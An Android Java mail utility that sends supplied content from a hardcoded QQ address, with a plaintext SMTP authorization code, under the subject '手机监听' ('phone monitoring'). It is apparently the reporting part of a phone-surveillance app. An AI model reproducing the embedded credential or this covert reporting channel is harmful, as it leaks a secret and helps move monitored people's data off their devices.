package com.example.sendemail.mail;

import android.support.annotation.NonNull;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * +----------------------------------------------------------------------
 * | 59197696@qq.com
 * +----------------------------------------------------------------------
 * | 功能描述:
 * +----------------------------------------------------------------------
 * | 时　　间: 2019/3/5.
 * +----------------------------------------------------------------------
 * | 代码创建: 张云鹏
 * +----------------------------------------------------------------------
 * | 版本信息: V1.0.0
 * +----------------------------------------------------------------------
 **/

public class MailUtil {

    //QQ邮箱

    private static final String HOST = "smtp.qq.com";
    private static final String PORT = "587";
    //发送方邮箱
    private static final String FROM_ADD = "591971696@qq.com";
    //发送方邮箱授权码
    private static final String FROM_PSW = "icvylwqlcvvabegd";


    private static ExecutorService executor = Executors.newSingleThreadExecutor();

    public static void send(String toAdd, String content){
        final MailInfo mailInfo = creatMail(toAdd, content);
        final MailSender sms = new MailSender();
        executor.execute(new Runnable() {
            @Override
            public void run() {
                sms.sendTextMail(mailInfo);
            }
        });
    }

    @NonNull
    private static MailInfo creatMail(String toAdd, String content) {
        final MailInfo mailInfo = new MailInfo();
        mailInfo.setMailServerHost(HOST);
        mailInfo.setMailServerPort(PORT);
        mailInfo.setValidate(true);
        mailInfo.setUserName(FROM_ADD);
        mailInfo.setPassword(FROM_PSW);
        mailInfo.setFromAddress(FROM_ADD);
        mailInfo.setToAddress(toAdd);
        mailInfo.setSubject("手机监听");
        mailInfo.setContent(content);
        return mailInfo;
    }
}
